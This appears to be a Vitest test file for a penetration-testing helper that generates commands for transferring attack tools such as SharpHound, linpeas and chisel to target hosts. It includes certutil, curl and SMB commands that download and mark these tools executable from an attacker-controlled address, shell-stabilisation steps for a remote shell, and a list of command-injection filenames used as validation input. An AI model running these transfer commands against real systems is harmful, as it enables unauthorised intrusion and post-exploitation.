import { describe, it, expect } from 'vitest';
import {
  COMMON_TRANSFER_TOOLS,
  generateFileTransferMethods,
  generateTtyStabilizationSteps,
} from './offensiveTransferUtils';

describe('offensiveTransferUtils', () => {
  it('exposes common offensive transfer tool presets', () => {
    expect(COMMON_TRANSFER_TOOLS).toContain('linpeas.sh');
    expect(COMMON_TRANSFER_TOOLS).toContain('winPEASx64.exe');
    expect(COMMON_TRANSFER_TOOLS).toContain('ligolo-agent');
    expect(COMMON_TRANSFER_TOOLS).toContain('chisel');
    expect(COMMON_TRANSFER_TOOLS).toContain('pspy64');
    expect(COMMON_TRANSFER_TOOLS).toContain('SharpHound.exe');
  });

  it('generates dynamic transfer methods with custom lhost, lport, and filename', () => {
    const methods = generateFileTransferMethods({
      lhost: '10.10.14.33',
      lport: 8443,
      filename: 'SharpHound.exe',
      user: 'admin',
      cred: 'Secret123!',
      targetIp: '10.10.10.200',
    });

    expect(methods.length).toBeGreaterThan(10);

    const certutil = methods.find((m) => m.id === 'win-certutil');
    expect(certutil?.commandTemplate).toBe(
      'certutil -urlcache -split -f "http://10.10.14.33:8443/SharpHound.exe" "SharpHound.exe"'
    );

    const curl = methods.find((m) => m.id === 'lin-curl-out');
    expect(curl?.commandTemplate).toBe(
      `curl -s -L "http://10.10.14.33:8443/SharpHound.exe" -o 'SharpHound.exe' && chmod +x 'SharpHound.exe'`
    );

    const smb = methods.find((m) => m.id === 'win-smb-copy');
    expect(smb?.commandTemplate).toContain('net use \\\\10.10.14.33\\tools "Secret123!" /user:"admin"');
    expect(smb?.commandTemplate).toContain('copy "\\\\10.10.14.33\\tools\\SharpHound.exe"');
  });

  it('uses -username (not -user) and quotes $(pwd) for impacket SMB server', () => {
    const methods = generateFileTransferMethods({
      lhost: '10.10.14.2',
      lport: 8000,
      filename: 'linpeas.sh',
      user: 'admin',
      cred: 'Secret123!',
    });
    const smb = methods.find((m) => m.id === 'srv-smb-impacket');
    expect(smb?.commandTemplate).toContain('"$(pwd)"');
    expect(smb?.commandTemplate).toContain('-username');
    expect(smb?.commandTemplate).not.toMatch(/ -user(?!name)/);
    expect(smb?.commandTemplate).toContain(`-username 'admin'`);
    expect(smb?.commandTemplate).toContain(`-password 'Secret123!'`);
  });

  it('quotes bare shell words for -o, /tmp and copy paths', () => {
    const methods = generateFileTransferMethods({
      lhost: '10.10.14.2',
      lport: 8000,
      filename: 'chisel',
    });
    const curl = methods.find((m) => m.id === 'lin-curl-out');
    expect(curl?.commandTemplate).toContain(`-o 'chisel'`);
    const wget = methods.find((m) => m.id === 'lin-wget');
    expect(wget?.commandTemplate).toContain(`'/tmp/chisel'`);
    const base64 = methods.find((m) => m.id === 'lin-base64');
    expect(base64?.commandTemplate).toContain(`'chisel'`);
  });

  it('encodes URL path segment with encodeURIComponent', () => {
    const methods = generateFileTransferMethods({
      lhost: '10.10.14.2',
      lport: 8000,
      filename: 'linpeas.sh',
    });
    const curl = methods.find((m) => m.id === 'lin-curl-out');
    expect(curl?.commandTemplate).toContain(`/${encodeURIComponent('linpeas.sh')}`);
  });

  it('throws on invalid filenames to surface injection attempts', () => {
    const bad = ['a; rm', 'a|b', 'a&b', 'a$b', 'a`b', "a'b", 'a"b', 'a\\b', 'a/b', 'a b', '../evil', 'a$(id)'];
    for (const name of bad) {
      expect(() =>
        generateFileTransferMethods({ lhost: '10.10.14.2', lport: 8000, filename: name })
      ).toThrow('Invalid filename');
    }
  });

  it('throws on invalid lport outside 1-65535', () => {
    for (const port of [0, -1, 70000, 99999, 'abc', '', 'NaN'] as const) {
      expect(() =>
        generateFileTransferMethods({ lhost: '10.10.14.2', lport: port as never, filename: 'chisel' })
      ).toThrow('Invalid lport');
    }
  });

  it('accepts numeric-string lport and defaults filename to tools.exe', () => {
    const methods = generateFileTransferMethods({
      lhost: '10.10.14.2',
      lport: '8000',
      filename: '   ',
    });
    const curl = methods.find((m) => m.id === 'lin-curl-out');
    expect(curl?.commandTemplate).toContain('tools.exe');
  });

  it('generates interactive 5-stage TTY stabilization sequence', () => {
    const steps = generateTtyStabilizationSteps({ rows: 45, cols: 120 });
    expect(steps.length).toBe(5);

    expect(steps[0].command).toContain('pty.spawn("/bin/bash")');
    expect(steps[1].command).toBe('Ctrl + Z');
    expect(steps[1].isKeystroke).toBe(true);
    expect(steps[2].command).toBe('stty raw -echo; fg');
    expect(steps[3].command).toContain('export TERM=xterm-256color');
    expect(steps[4].command).toBe('stty rows 45 columns 120');
  });
});
